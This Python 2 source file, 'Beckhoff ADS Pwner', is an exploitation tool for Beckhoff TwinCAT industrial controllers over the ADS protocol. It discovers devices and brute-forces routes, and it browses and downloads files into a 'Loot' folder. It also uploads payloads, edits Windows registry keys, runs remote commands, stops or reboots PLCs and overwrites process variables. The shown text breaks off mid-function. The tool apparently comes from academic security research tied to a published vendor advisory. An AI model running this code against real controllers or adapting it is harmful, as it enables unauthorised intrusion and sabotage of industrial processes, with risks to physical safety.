#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
	Copyright 2019 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        Work done with immense help from Tinus Umans from IC4 (Ghent University)

        This should work on Linux & Windows using Python2
        
        File name Beckhoff_ADS_Pwner.py
        written by tijl[dot]deneut[at]howest[dot]be & tinus[dot]umans[at]ugent[dot]be

        --- Beckhoff ADS Pwner ---
        This is an extended and updated version of the "FullBeckhoffScan.py" script.
        And now allows to browse, download and upload files.
        And to change HKLM Registry Keys.
        And to reboot/shutdown the device.
        
        Fix: https://download.beckhoff.com/download/Document/product-security/Advisories/advisory-2017-001.pdf
'''

## This will brute force a device for known routes

import sys, os, binascii, socket, subprocess, time, struct, math, random, string

iTimeout = 2
HostDevice = {'IP': '','NAME':'','RNETID':'','TCVER':'','WINVER':''}
HostPort = 48898

# Support Structures
#region

def send_and_recv(s, packet):
    data=binascii.unhexlify(packet.replace(' ',''))
    s.send(data)
    return s.recv(4096)

def send_and_recv_mult(s, packet, length):
    data=binascii.unhexlify(packet.replace(' ',''))
    s.send(data)
    resp = ''
    for i in range(0, 1+int(math.ceil(length / 1460))): 
        resp += s.recv(1460)       
    return resp

def send_and_recv_mult_ADS(s, packet ):
    data=binascii.unhexlify(packet.replace(' ',''))
    s.send(data)  
    # Receive first packet. It holds the total length of the message to come
    xFirstResponse = True
    resp = ''
    iMaxLength = 33767 # a large value that we will change when receiving our first frame
    while len(resp) < iMaxLength:
        resp += s.recv(1460)
        if xFirstResponse :
            RespTranslated=binascii.hexlify(resp)
            iMaxLength = Split_AMS_HEADER(RespTranslated)['cbData']
            xFirstResponse = False
    return resp

def send_only(s, ip, port, string):
    data=binascii.unhexlify(string.replace(' ',''))
    s.sendto(data, (ip, port))

def recv_only(s):
    data, addr=s.recvfrom(4096)
    return data, addr

def getAddresses():
    interfaces=[]
    if os.name == 'nt': # This should work on Windows
        proc=subprocess.Popen("ipconfig | FINDSTR \"IPv4 Address\" | FINDSTR /V \"IPv6\"",shell=True,stdout=subprocess.PIPE)
        for interface in proc.stdout.readlines():
            ip = interface.split(':')[1].rstrip().lstrip()
            interfaces.append(ip)
    else: # And this on any Linux
        proc=subprocess.Popen("ip address | grep inet | grep -v \"127.0.0.1\" | grep -v \"inet6\"", shell=True, stdout=subprocess.PIPE)
        for interface in proc.stdout.readlines():
            ip = interface.lstrip().split(' ')[1].split('/')[0]
            interfaces.append(ip)
    return interfaces

def ConvertHexAMS(ip):
    oReturn = ''
    temp = ip.split(".")
    if not (len(temp) == 4  or len(temp) ==6):
        return 
    for i in range(0, len(temp)):
        oReturn += ConvertInt(temp[i],2)
    return oReturn

def ConvertdecAMS(ip):
    oReturn = []
    for i in range(0, len(ip),2):
        oReturn.append(str( int(ip[i:i+2],16)) )
    return  ".".join(oReturn)

def ConvertInt(iInput, length): 
    return  struct.pack("<I" , int(iInput)).encode('hex')[:length]

def InvertPacket(sHexInput):
    sInverted = ""
    for x in range(-1, -len(str(sHexInput)), -2):
        sInverted += sHexInput[x-1] + sHexInput[x]
    return sInverted

def ConvertInvertedToInt(sHexInput): 
    if len(sHexInput) == 0 : return 0
    return int(InvertPacket(sHexInput), 16)

def Store_Byte_Array_To_File(Device , arrByteData , FileName):
    if not os.path.exists('Loot'):
        os.mkdir('Loot')
    if not os.path.exists('Loot/'+ Device['IP']):
        os.mkdir('Loot/'+ Device['IP'])
    f = open('Loot/'+ Device['IP'] +'/'+ FileName, 'w+b')
    f.write(arrByteData)
    f.close()
    return

#endregion 

# Main Commands (UDP & AMS)
#region

def UDP_Command(ams_target_id , ams_target_port , ams_source_id , ams_source_port ,cmdID, stateflags , lstADSparam = []):
    # converteren naar juiste notaties
    ams_target_id = ConvertHexAMS(ams_target_id)
    ams_source_id = ConvertHexAMS(ams_source_id)
    ams_target_port = ConvertInt(ams_target_port , 4)
    ams_source_port = ConvertInt(ams_source_port , 4)
    stateflags = ConvertInt(stateflags , 4)
    Errorcode = ConvertInt(0,8)
    InvodeID = ConvertInt(random.randint(1,10000),8)
    # Construct message (depends on cmdID)
    packet = ''
    if (cmdID == 0): # ADS discovery
        if (len(lstADSparam) != 0) : raise Exception("ADS parameter length mismatch")
        packet =  '03 66 14 71' + ams_target_id + ' ' + ams_target_port + ' '+ams_source_id + ' ' + ams_source_port +' ' + ConvertInt(cmdID , 4) + ' ' +stateflags 
    elif (cmdID == 5):
        if (len(lstADSparam) != 5) : raise Exception("ADS parameter length mismatch")
        # [ nameroute , amsroute , username , password, ipaddres]
        NameRoute = binascii.hexlify(lstADSparam[0])
        NameRoute_Len = ConvertInt( len(NameRoute)/2,4)
        AMSroute = ConvertHexAMS(lstADSparam[1])
        AMSroute_Len = ConvertInt( len(AMSroute)/2,4)
        Username =binascii.hexlify( lstADSparam[2]) +'00'
        Username_Len = ConvertInt( len(Username)/2,4)
        Password = binascii.hexlify(lstADSparam[3]) +'00'
        Password_Len = ConvertInt( len(Password)/2,4)
        IPaddress =binascii.hexlify( lstADSparam[4])+'00'
        IPaddress_Len = ConvertInt( len(IPaddress)/2,4) 
        packet =  '03 66 14 71' + ams_target_id + ' ' + ams_target_port + ' '+ams_source_id + ' ' + ams_source_port +' ' + ConvertInt(cmdID , 4) + ' ' +stateflags 
        packet += '0c001000' + NameRoute + '00 07 00 '+ AMSroute_Len+ AMSroute + '0d00' +Username_Len+Username+'0200'+Password_Len+Password+'0500'+IPaddress_Len+IPaddress
    else:
        raise Exception("cmdID out of range / Not Implemented Yet")
    return packet

def AMS_Command( ams_target_id , ams_target_port , ams_source_id , ams_source_port ,cmdID, stateflags , lstADSparam = []):
    # converteren naar juiste notaties
    ams_target_id = ConvertHexAMS(ams_target_id)
    ams_source_id = ConvertHexAMS(ams_source_id)
    ams_target_port = ConvertInt(ams_target_port , 4)
    ams_source_port = ConvertInt(ams_source_port , 4)
    stateflags = ConvertInt(stateflags , 4)
    Errorcode = ConvertInt(0,8)
    InvodeID = ConvertInt(random.randint(1,10000),8)
    # Construct message (depends on cmdID)
    packet = ''
    if (cmdID == 0): # ADS login/discovery
        raise Exception("Not (yet) Implemented")
    elif (cmdID == 1):
        raise Exception("Not (yet) Implemented")
    elif (cmdID == 2): #ADS Read
        if (len(lstADSparam) != 3) : raise Exception("ADS parameter length mismatch")
        indexgroup= ConvertInt( lstADSparam[0], 8)
        indexoffset= ConvertInt( lstADSparam[1], 8)
        cbReadlength = ConvertInt( lstADSparam[2], 8)
        packet = indexgroup +' '+ indexoffset +' '+ cbReadlength +' '
    elif (cmdID == 3):#Write
        if (len(lstADSparam) != 3) : raise Exception("ADS parameter length mismatch")
        # indexgroup = 0, indexoffset =0 , Data=''
        indexgroup= ConvertInt( lstADSparam[0], 8)
        indexoffset= ConvertInt( lstADSparam[1], 8)
        #Data = binascii.hexlify(lstADSparam[2].replace(' ',''))
        Data = binascii.hexlify(lstADSparam[2])
        cbWriteLength = ConvertInt(len(Data)/2, 8)
        packet = indexgroup +' '+ indexoffset +' '+  cbWriteLength+ ' '+ Data
    elif (cmdID == 4):
         if (len(lstADSparam) != 0) : raise Exception("ADS parameter length mismatch")
         packet = ''
    elif (cmdID == 5):
        if (len(lstADSparam) != 3) : raise Exception("ADS parameter length mismatch")
        # ADSState = 0, DeviceState =0 , Data=''
        ADSstate= ConvertInt( lstADSparam[0] ,4 )
        DeviceState= ConvertInt( lstADSparam[1] ,4 )
        #Data = binascii.hexlify(lstADSparam[2])
        Data = ConvertInt(lstADSparam[2], 8)
        cbLength = ConvertInt(len(Data)/2, 8)
        packet = ADSstate+ ' ' + DeviceState + ' '+ cbLength + ' '+ Data
    elif (cmdID == 6):
        raise Exception("Not (yet) Implemented")
    elif (cmdID == 7):
        raise Exception("Not (yet) Implemented")
    elif (cmdID == 8):
        raise Exception("Not (yet) Implemented")
    elif (cmdID == 9): # ReadWrite
        if (len(lstADSparam) != 4) : raise Exception("ADS parameter length mismatch")
        # indexgroup = 0, indexoffset =0 , cbReadlength=0 , Data=''
        indexgroup= ConvertInt( lstADSparam[0] ,8 )
        indexoffset= ConvertInt( lstADSparam[1] ,8 )
        cbReadlength = ConvertInt( lstADSparam[2] , 8)
        Data = binascii.hexlify(lstADSparam[3])
        cbWriteLength = ConvertInt(len(Data)/2, 8)
        packet = indexgroup +' '+ indexoffset +' '+ cbReadlength +' '+ cbWriteLength+ ' '+ Data
    else:
        raise Exception("cmdID out of range")

    cbData = ConvertInt( len(packet.replace(' ' , ''))/2,8)
    packet = ams_target_id + ' ' + ams_target_port + ' '+ams_source_id + ' ' + ams_source_port +' ' + ConvertInt(cmdID , 4) + ' ' +stateflags +' '+ cbData + ' ' + Errorcode +' '+ InvodeID +' '+ packet
    AMSLength = ConvertInt( len(packet.replace(' ' , ''))/2,8)
    packet = '0000' + ' ' +AMSLength + ' '+ packet

    return packet

#endregion

# Filter Response
#region
def Split_AMS_HEADER(responsePacket):
    packetLength = ConvertInvertedToInt(responsePacket[4:12])
    ams_target_id = ConvertdecAMS(responsePacket[12:24])
    ams_target_port =ConvertInvertedToInt( responsePacket[24:28])
    ams_source_id = ConvertdecAMS(responsePacket[28:40])
    ams_source_port = ConvertInvertedToInt(responsePacket[40:44])
    cmdID = InvertPacket(responsePacket[44:48])
    stateFlags = InvertPacket(responsePacket[48:52])
    cbData =ConvertInvertedToInt( responsePacket[52:60])
    ErrorCode =InvertPacket( responsePacket[60:68])
    InvokeId =InvertPacket(responsePacket[68:76])
    ADS_Data = responsePacket[76:]
    return {'packetLength':packetLength,
            'ams_target_id':ams_target_id,
            'ams_target_port':ams_target_port,
            'ams_source_id':ams_source_id,
            'ams_source_port':ams_source_port,
            'cmdID':cmdID,
            'stateFlags':stateFlags,
            'cbData':cbData,
            'ErrorCode':ErrorCode,
            'InvokeId':InvokeId,
            'ADS_Data':ADS_Data}

def Split_ADS_ReadWriteResponse(responsePacket):
    Result = InvertPacket(responsePacket[0:8])
    cbLength = ConvertInvertedToInt(responsePacket[8:16])
    ADS_Data = (responsePacket[16:])
    return {'Result':Result,
            'cbLength':cbLength,
            'ADS_Data':ADS_Data}
#endregion

# AMS Functions
#region

def getDevices():
    global HostDevice
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(iTimeout)
    sock.bind((HostDevice['IP'],0))
    
    print('Sending the discovery packets and waiting ' + str(iTimeout) + ' seconds for answers...')
    packet = UDP_Command('00.00.00.00.01.00', 0 , '00.00.00.00.00.00' , 10000, 0,0)
    send_only(sock, '255.255.255.255', 48899,packet)
    receivedData = []
    while True:
        try: receivedData.append(recv_only(sock))
        except: break
    sock.close()
    arrDevices=[]
    for data in receivedData:
        data,ip=data
        hexdata=binascii.hexlify(data)
        netid=hexdata[24:36]
        namelength=int(hexdata[54:56]+hexdata[52:54],16)
        name=data[28:27+namelength]
        i = (27+namelength)*2 + 18       
        kernel=str(ConvertInvertedToInt(hexdata[i:i+8]))+'.'+str(ConvertInvertedToInt(hexdata[i+8:i+16]))+'.'+str(ConvertInvertedToInt(hexdata[i+16:i+24]))
        i = i+24+528
        twincatversion=str(ConvertInvertedToInt(hexdata[i:i+2]))+'.'+str(ConvertInvertedToInt(hexdata[i+2:i+4]))+'.'+str(ConvertInvertedToInt(hexdata[i+4:i+8]))
        rest = hexdata[i+8:]

        if name!='':
            arrDevices.append({'IP':ip[0],'NAME':name,'RNETID':ConvertdecAMS(netid),'TCVER':twincatversion,'WINVER':kernel, 'REST':rest})
        if ip[0]==HostDevice['IP']:
            HostDevice = {'IP':ip[0],'NAME':name,'RNETID':ConvertdecAMS(netid),'TCVER':twincatversion,'WINVER':kernel}
    return arrDevices ## Array of devices[ip, name, netid, twincatversion, kernel]



def getRemoteRoutes(Device,HostDevice,s,xShowMe = False):
    returnarr = []
    attempt=5 ## This sometimes ends prematurely (no responses), attempting it 5 times
    i=0
    while i>=0:
        ## IndexID, first route is '0', second is '1' etc...ac108c550101 
        packet =  AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,2,4,[803,i,2092])
        resp = send_and_recv(s, packet)
   
        respPacket =  Split_AMS_HEADER(binascii.hexlify(resp))
        if respPacket['cbData'] < 60:
            if attempt>0 and i==0:
                attempt=attempt-1
            else:
                print(str(i)+' routes found')
                i = -1
        else:
            respData = Split_ADS_ReadWriteResponse(respPacket['ADS_Data'])['ADS_Data']
            NetID =ConvertdecAMS(respData[0:12])

            arrTemp = binascii.unhexlify(respData[88:]).split('\x00')
            Address = arrTemp[0]
            Name = arrTemp[1]
          
            if xShowMe:
                print('NetID = '+NetID+', Address = '+Address+', Name = '+Name)
            returnarr.append((Name,Address))
            i += 1
    return returnarr

def AddRoute(Device , HostDevice ,  sParam): ## Using UDP
    if len(sParam) != 5 : raise Exception("Parameter mismatch for adding route")
    # sParam = [Name route , AMS route , User , Password , IP]
    udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udpsock.settimeout(iTimeout)
    udpsock.bind((HostDevice['IP'],0))
    packet= UDP_Command('00.00.00.00.06.00', 0,HostDevice['RNETID'],10000,5,0,  sParam )   
    send_only(udpsock, Device['IP'], 48899, packet)
    resp = recv_only(udpsock)
    hexdata = binascii.hexlify(resp[0])
    amsnetid = ConvertdecAMS(hexdata[24:36])

    amsnetid = str(int(hexdata[24:26],16))+'.'+str(int(hexdata[26:28],16))+'.'

    udpsock.close()
    return amsnetid

def RemoveRoute(Device, HostDevice , s , sRoute):
    packet = AMS_Command( Device['RNETID'], 10000,HostDevice['RNETID'], 32974 , 3,4,[802,0,sRoute + '\x00'])
    try:
        resp = send_and_recv(s,packet)
        # we will return the error code
        return ConvertInvertedToInt(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'])
    except:
        pass
    return ''
    
def BrowseFiles(Device, HostDevice ,s,  relativeDir):
    sFiles = []
    try:
        # Specify directory where we want to look for files
        packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33022,9,4, [133, 4 , 324 , relativeDir + '\\*.*' +'\0'])
        resp=send_and_recv(s, packet)
        NewOffset = ConvertInvertedToInt(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'][0:8])
        # Enumerate Files in directory 
        xMoreFiles = True   
        while xMoreFiles:
            packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33022,9,4, [133, NewOffset , 324 , ''])
            resp=send_and_recv(s, packet)
            # retrieve filename from response
            respData =  Split_ADS_ReadWriteResponse(Split_AMS_HEADER(binascii.hexlify(resp))['ADS_Data'])['ADS_Data'][96:]
            Filename = binascii.unhexlify(respData)
    
            Filename = Filename[0:Filename.find('\x00')]
            if len(Filename) > 0:
                sFiles.append(Filename)
            else:
                xMoreFiles = False
    except Exception as oError:
        print("error  " + str(oError))  
    return sFiles

def BrowseFile_V2(Device, HostDevice, s, sPath):
    sFiles = []
    try:

        # Specify directory where we want to look for files
        packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33022,9,4, [133, 1 , 324 , sPath + '\\*.*' +'\0'])
        resp=send_and_recv(s, packet)
        NewOffset = ConvertInvertedToInt(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'][0:8])
        xMoreFiles = True
        while xMoreFiles:
            packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33022,9,4, [133, NewOffset , 324 , ''])
            resp=send_and_recv(s, packet)
            # retrieve filename from response
            respData =  Split_ADS_ReadWriteResponse(Split_AMS_HEADER(binascii.hexlify(resp))['ADS_Data'])['ADS_Data']
            
            Filename = binascii.unhexlify(respData[96:])  
            Filename = Filename[0:Filename.find('\x00')] 


            if len(Filename) > 0:
                NewOffset = ConvertInvertedToInt(respData[0:8])              
                FileInfo = {'FileName':Filename,
                        'FileAttr':respData[8:16], 
                        'CreationTime_LowDateTime':ConvertInvertedToInt(respData[16:24]), 
                        'CreationTime_HighDateTime':ConvertInvertedToInt(respData[24:32]),
                        'LastAccessTime_LowDateTime':ConvertInvertedToInt(respData[32:40]),
                        'LastAccessTime_HighDateTime':ConvertInvertedToInt(respData[40:48]),
                        'LastWriteTime_LowDateTime':ConvertInvertedToInt(respData[48:56]),
                        'LastWriteTime_HighDateTime':ConvertInvertedToInt(respData[56:64]),
                        'FileSize_LowPart':ConvertInvertedToInt(respData[64:72]),
                        'FileSize_HighPart':ConvertInvertedToInt(respData[72:80])                    
                        }
                sFiles.append(FileInfo)
            else:
                xMoreFiles = False
    except Exception as oError:
        print("error  " + str(oError) + str(oError.args))
    return sFiles

def DownloadFile(Device, HostDevice, s, sPath, FileName):
    try:
        packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33022,9,4, [120, 1, 4, sPath+FileName+ '\0'])
        resp=send_and_recv(s, packet)
        NewOffset = ConvertInvertedToInt(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'])
        # Multiple multi-frames are needed to get the .tpzip file copied
        if NewOffset == 0 : raise Exception("Error (ADS code : " + str(InvertPacket(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data']))+ ")")
        totalResponse = ''
        xLastPackage = False
        while not xLastPackage :
            packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33022,9,4, [122, NewOffset, 16384, ''])
            resp=send_and_recv_mult_ADS(s, packet)
            debug1 =Split_AMS_HEADER(binascii.hexlify(resp))['ADS_Data']

            ProcessedResponse = Split_ADS_ReadWriteResponse(Split_AMS_HEADER(binascii.hexlify(resp))['ADS_Data'])
            iLengthResp = ProcessedResponse['cbLength']
            if iLengthResp != 16384:
                xLastPackage = True
            totalResponse +=ProcessedResponse['ADS_Data']
    
        # Store data from frame
        arrDataBytes =bytearray(binascii.unhexlify(totalResponse))
        Store_Byte_Array_To_File(Device, arrDataBytes, FileName)
        print('Download succeeded')
    except Exception as oError:
        print('Download Failed  ' + str(oError))
    return

def Upload_File(Device,HostDevice,s, Payload_LocalPath , Payload_TargetPath):

    # openen van payload
    arrByteData=[]
    f = open(Payload_LocalPath, 'r+b')
    FileToSend = bytearray(f.read())
    f.close()


    # Tell PLC where to store the file and get the offset to write to
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,9,4, [120, 65618 , 4 ,Payload_TargetPath+ '\0'])
    resp=send_and_recv(s, packet)

    NewOffset = ConvertInvertedToInt(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'])

    # Send File
    for i in range(0,len(FileToSend),16384):
        FilePart = FileToSend[i:]
        if len(FilePart) > 16384:
            FilePart = FilePart[0:16384]
        packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,9,4, [123, NewOffset , 0 ,FilePart])
        resp=send_and_recv(s, packet)
        print('Bytes send : ' + str(i+len(FilePart)) + '  /  ' + str(len(FileToSend)))

    #end file transfer
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,9,4, [121, NewOffset , 0 ,''])
    resp=send_and_recv(s, packet)

    return

def Read_Registry_Value(Device , HostDevice,s, sRegPath , sRegVar):
    # sRegPath ='SYSTEM\\CurrentControlSet\\Control\\SystemInformation'
    # sRegVar = 'BIOSVersion'

    packet = AMS_Command(Device['RNETID'], 10000, HostDevice['RNETID'], 33010, 9, 4, [200, 0, 1000, sRegPath + '\0' + sRegVar + '\0'])
    resp = send_and_recv(s, packet)
    respData = binascii.unhexlify(Split_ADS_ReadWriteResponse(Split_AMS_HEADER(binascii.hexlify(resp))['ADS_Data'])['ADS_Data'])
    return respData

def Set_Registry_Value(Device , HostDevice ,s, sRegPath , sRegVar, sNewVal, bDWORD):
    print('setting: '+str(sRegVar))
    if bDWORD == 1: ## \x04 == REG_DWORD
        sNewVal = binascii.unhexlify(ConvertInt(sNewVal, 8)) ## new value should be 4 bytes long (1 becomes \x01\x00\x00\x00)
        packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,3,4, [200, 0 , sRegPath +'\0'+sRegVar+ '\x00\x04\x00\x00\x00' +sNewVal])
    else: ## \x01 == REG_SZ
        packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,3,4, [200, 0 , sRegPath +'\0'+sRegVar+ '\x00\x01\x00\x00\x00' +sNewVal + '\0'])
    resp=send_and_recv(s, packet)
    return

def RemoteCodeExecution(Device , HostDevice, s ,sPath,sDir, sParam):
    PathLength =  binascii.unhexlify(ConvertInt(len(sPath),8))
    DirLength = binascii.unhexlify( ConvertInt(len(sDir),8))
    ParamLength = binascii.unhexlify( ConvertInt(len(sParam),8))
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,3,4, [500, 0 , PathLength+ DirLength+ParamLength+ sPath +'\0'+sDir+ '\0' + sParam + '\0'])
    
    resp=send_and_recv(s, packet)
    return

def RebootDevice(Device, HostDevice , s , iDelay):
    AdsState = 12
    Devicestate = 1
    Data = ConvertInt(int(iDelay) ,8 )
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,5, 4,[AdsState,Devicestate,Data])
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,5, 4,[AdsState,Devicestate,0])
    resp=send_and_recv(s, packet)
    return 

def ShutdownDevice(Device, HostDevice, s, iDelay):
    AdsState = 12
    Devicestate = 0
    Data = ConvertInt(iDelay ,8 )
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,5, 4,[AdsState,Devicestate,Data])
    resp=send_and_recv(s, packet)
    return 

def AbortShutdownDevice(Device, HostDevice, s, iDelay):
    AdsState = 10
    Devicestate = 0
    Data = ConvertInt(iDelay ,8 )
    packet = AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],33010,5, 4,[AdsState,Devicestate,Data])
    resp=send_and_recv(s, packet)
    return 

def getDeviceXML(Device , HostDevice, s):
    resData = 'Error' 
    try:
        packet =AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],32786,2,4, [700,1,4])
        resp = send_and_recv(s,packet)

        LengthData = ConvertInvertedToInt(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'])

        packet =AMS_Command(Device['RNETID'],10000,HostDevice['RNETID'],32786,2,4, [700,1,LengthData+1000])
        resp = send_and_recv(s,packet)

        resData =binascii.unhexlify( Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data']).replace('\x00' ,'')
    except:
        pass
    return resData

def getDeviceState(Device , HostDevice, s):
    packet= AMS_Command(Device['RNETID'],10000 , HostDevice['RNETID'] , 32975,4,4,[] )
    resp=send_and_recv(s, packet)
    respData = Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data']
    AdsState = ConvertInvertedToInt(respData[8:12])
    DeviceState = ConvertInvertedToInt(respData[12:])
    AdsValues = ['Invalid','Idle','Reset','Init','Start','Run','Stop','SaveConfig','LoadConfig','PowerFailure','PowerGood','Error','Shutdown','Suspend','Resume','Config','Reconfig','Maxstates']
    return {"AdsState":AdsValues[AdsState], "DeviceState":DeviceState}

def setDeviceState(Device, HostDevice , s, sState):
    AdsState = 0
    Devicestate =0
    if sState == "RUN":
        AdsState =2
    elif sState =="RESET":
        AdsState = 5
    elif sState=="STOP":
        AdsState =  6
    elif sState=="CONFIG":
        AdsState =  16
    packet = AMS_Command(Device['RNETID'],10000 , HostDevice['RNETID'],32935,5,4,[AdsState , Devicestate, ''] )
    resp=send_and_recv(s, packet)

    return

def addTCRoute(Device, HostDevice): #### , s, sRouteName, sTargetIP): ## 010203040506 0100 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0c00 0000 0500 0000 0000 0000 31302e31312e31322e3133005445535400
    sTargetIP = raw_input('Please enter route IP [1.2.3.4]: ')
    if sTargetIP == '': sTargetIP = '1.2.3.4'
    sTargetNETID = raw_input('Please enter route NETID ['+sTargetIP+'.1.1]: ')
    if sTargetNETID == '': sTargetNETID = sTargetIP + '.1.1'
    sTargetName = raw_input('Please enter route name [\'TEST\']: ')
    if sTargetName == '': sTargetName = 'TEST'
    sData = ConvertHexAMS(sTargetIP+'.1.1') ## NETID to use
    sData += '0100 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000'
    sData += ConvertInt(len(sTargetIP) +1 , 8) ## '0c00 0000' ## Length of IP address string ("11.12.13.14" == 12 bytes)
    sData += ConvertInt(len(sTargetName) + 1, 8) ## '0500 0000'
    sData += '00000000'
    sData += binascii.hexlify(sTargetIP) + '00' + binascii.hexlify(sTargetName.upper()) + '00'
    packet = AMS_Command(Device['RNETID'], 10000 , HostDevice['RNETID'] , 350, 3, 4, [0x321, 0x0, binascii.unhexlify(sData.replace(' ',''))])
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(iTimeout)
    s.connect((Device['IP'], HostPort))
    #resp = send_and_recv(s, packet)
    #data=binascii.unhexlify(packet.replace(' ',''))
    s.send(binascii.unhexlify(packet.replace(' ','')))
    s.close()
    return
    
def GetListVariables(Device, HostDevice , s):
    #lengte datapakket
    packet = AMS_Command(Device['RNETID'],851,HostDevice['RNETID'],37312,2, 4,[61455,0,64])
    resp=send_and_recv(s, packet)
    respData = Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data']
    FirstDataLength = ConvertInvertedToInt(respData[8:16])
    #ophalen data
    packet = AMS_Command(Device['RNETID'],851,HostDevice['RNETID'],37312,2, 4,[61451,0,FirstDataLength])
    resp=send_and_recv_mult_ADS(s, packet)
    respData = Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data']
    #Output file maken
    if not os.path.exists('Loot'):
        os.mkdir('Loot')
    if not os.path.exists('Loot/'+ Device['IP']):
        os.mkdir('Loot/'+ Device['IP'])
    f = open('Loot/'+ Device['IP'] +'/OverviewVars.xml', 'w')
    f.write("<?xml version=\"1.0\"?><PLCvariabelen>")
    #uitlezen data
    while len(respData)!=0:
        iLength = ConvertInvertedToInt(respData[0:8])*2
        varData = respData[8:iLength]
        respData = respData[iLength:]
        #collect data
        iIndexGroup = ConvertInvertedToInt(varData[0:8])
        iIndexOffset = ConvertInvertedToInt(varData[8:16])
        iUnknown = ConvertInvertedToInt(varData[16:24])
        iUnknown2 = ConvertInvertedToInt(varData[24:32])
        iUnknown3 =ConvertInvertedToInt(varData[32:40])
        iLengthVarname = ConvertInvertedToInt(varData[40:44])*2
        iLengthVarType = ConvertInvertedToInt(varData[44:48])*2
        iLengthComment = ConvertInvertedToInt(varData[48:52])*2
        sName = binascii.unhexlify(varData[52:52+iLengthVarname])
        sVarType = binascii.unhexlify(varData[54+iLengthVarname:54+iLengthVarname+iLengthVarType])
        sComment = binascii.unhexlify(varData[56+iLengthVarname+iLengthVarType:56+iLengthVarname+iLengthVarType+iLengthComment])
        # schrijven variabelen in xml
        f.write("<Variabele>")
        f.write("<Name>" +sName + "</Name>"  )
        f.write("<Type>" + sVarType + "</Type>")
        f.write("<Comment>" + sComment.replace('&', '&amp').replace('>', '&gt').replace('<', '&lt').replace(';', '&sc').replace('\'', '&apos').replace('\"', '&quot') + "</Comment>")
        f.write("<IndexGroup>"+ str(iIndexGroup) +"</IndexGroup>")
        f.write("<IndexOffset>"+ str(iIndexOffset) +"</IndexOffset>")
        f.write("<Length>"+str(iUnknown)+"</Length>")
        f.write("<par2>"+str(iUnknown2)+"</par2>")
        f.write("<par3>"+str(iUnknown3)+"</par3>")
        f.write("</Variabele>")
    f.write("</PLCvariabelen>")
    f.close()
    return 

def ReadVariable(Device, HostDevice, s , IndexGroup , IndexOffset , Length, Type = ''):
    packet = AMS_Command(Device['RNETID'],851,HostDevice['RNETID'],47434,2, 4,[int(IndexGroup),int(IndexOffset),int(Length)])
    resp=send_and_recv(s, packet)
    respData = binascii.unhexlify(Split_ADS_ReadWriteResponse(Split_AMS_HEADER( binascii.hexlify(resp))['ADS_Data'])['ADS_Data'])
    if Type == "STRING": 
        return respData.replace("\x00" , "")
    elif Type =="INT":
        return ConvertInvertedToInt(respData)
        
    return respData

def WriteVariable(Device, HostDevice, s , IndexGroup, IndexOffset , Length, Data ):
    inputlen = len(Data)
    for i in range(0,int(Length) - inputlen): Data = Data + "\0"
    packet = AMS_Command(Device['RNETID'],851,HostDevice['RNETID'],47434,3, 4,[int(IndexGroup),int(IndexOffset), Data])
    resp=send_and_recv(s, packet)
    return 

#endregion

# GUI
#region

def GUI_VerifyDevice(Device , HostDevice  , noprint=0):
    os.system('cls' if os.name == 'nt' else 'clear')
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(iTimeout)
    s.connect(( Device['IP'],HostPort))
    state = getDeviceState( Device, HostDevice, s)
    s.close()
    if noprint:
        if state['AdsState']=='Error' or state['AdsState']=='Invalid':
            print('Device seems unreachable using TCP, please add a route!')
            raw_input('Press [Enter] to continue')
        return state
    if  state['AdsState']=='Run':
